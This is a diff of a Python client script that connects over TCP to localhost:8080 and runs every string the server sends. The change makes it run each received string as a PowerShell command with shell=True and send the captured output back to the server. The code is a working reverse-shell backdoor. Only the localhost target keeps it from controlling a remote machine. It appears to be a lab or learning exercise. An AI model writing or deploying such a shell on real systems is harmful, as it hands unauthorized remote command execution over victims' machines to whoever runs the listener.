@@ -2,8 +2,7 @@ import socket
 import time
 import signal
 import sys
-
-from os import system
+import subprocess
 
 running = True
 
@@ -21,8 +20,6 @@ def connect():
     while running:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            print("[*] Connecting to localhost:8080...")
-            
             client.connect(('localhost', 8080))
             print("[*] Connected!")
             
@@ -33,7 +30,31 @@ def connect():
                     print("[*] Server closed connection")
                     break
                 
-                system(data.decode())
+                command = data.decode()
+                
+                try:
+                    result = subprocess.run(
+                        "powershell -Command " + command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=30
+                    )
+                    
+                    output = result.stdout + result.stderr
+                    
+                    if not output:
+                        output = "[*] Command executed (no output)\n"
+                    
+                    delimiter = "\n<<<END_OF_OUTPUT>>>\n"
+                    full_message = output + delimiter
+                    client.sendall(full_message.encode('utf-8'))
+                    
+                except subprocess.TimeoutExpired:
+                    client.sendall(b"[!] Command timed out\n<<<END_OF_OUTPUT>>>\n")
+                except Exception as e:
+                    error_msg = f"[!] Error: {str(e)}\n<<<END_OF_OUTPUT>>>\n"
+                    client.sendall(error_msg.encode('utf-8'))
             
             client.close()
             print("[*] Connection closed")
